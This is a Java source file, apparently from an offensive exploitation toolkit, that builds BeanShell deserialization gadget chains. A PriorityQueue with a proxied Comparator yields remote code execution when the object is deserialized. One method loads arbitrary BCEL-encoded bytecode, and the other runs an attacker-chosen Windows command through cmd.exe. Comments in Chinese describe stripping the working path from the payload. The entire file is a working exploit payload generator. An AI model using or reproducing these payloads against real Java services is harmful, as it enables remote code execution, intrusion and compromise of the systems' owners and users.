package payload;

import bsh.Interpreter;
import bsh.NameSpace;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.lang.reflect.*;
import java.util.Comparator;
import java.util.PriorityQueue;

public class BeanShell {
    //加载BCEL字节码
    public Object classloader(Class classname) throws Exception{
        JavaClass cls = Repository.lookupClass(classname);
        String code = Utility.encode(cls.getBytes(), true);
        String[] payload = new String[]{"$$BCEL$$" + code};

        String compareMethod = "compare(Object foo, Object bar) {new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\""+payload[0]+"\").newInstance();return new Integer(1);}";

        Interpreter interpreter = new Interpreter();
        //移除敏感信息(当前运行的路径)
        Method setu = interpreter.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
        setu.setAccessible(true);
        setu.invoke(interpreter,new Object[]{"bsh.cwd","."});

        interpreter.eval(compareMethod);

        Class clz = Class.forName("bsh.XThis");
        Constructor constructor = clz.getDeclaredConstructor(NameSpace.class, Interpreter.class);
        constructor.setAccessible(true);
        Object xt = constructor.newInstance(interpreter.getNameSpace(),interpreter);

        InvocationHandler handler = (InvocationHandler) getField(xt.getClass(), "invocationHandler").get(xt);

        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        setFieldValue(priorityQueue, "queue", queue);
        setFieldValue(priorityQueue, "size", 2);
        return priorityQueue;
    }
    //windows下的命令执行
    public Object exec(String cmd) throws Exception{
        String compareMethod = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"cmd.exe\",\"/c\",\""+cmd+"\"}).start();return new Integer(1);}";
        Interpreter interpreter = new Interpreter();

        //移除敏感信息(当前运行的路径)
        Method setu = interpreter.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
        setu.setAccessible(true);
        setu.invoke(interpreter,new Object[]{"bsh.cwd","."});

        interpreter.eval(compareMethod);

        Class clz = Class.forName("bsh.XThis");
        Constructor constructor = clz.getDeclaredConstructor(NameSpace.class, Interpreter.class);
        constructor.setAccessible(true);
        Object xt = constructor.newInstance(interpreter.getNameSpace(),interpreter);

        InvocationHandler handler = (InvocationHandler) getField(xt.getClass(), "invocationHandler").get(xt);

        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        setFieldValue(priorityQueue, "queue", queue);
        setFieldValue(priorityQueue, "size", 2);
        return priorityQueue;
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static void setAccessible(AccessibleObject member) {
        member.setAccessible(true);
    }
}
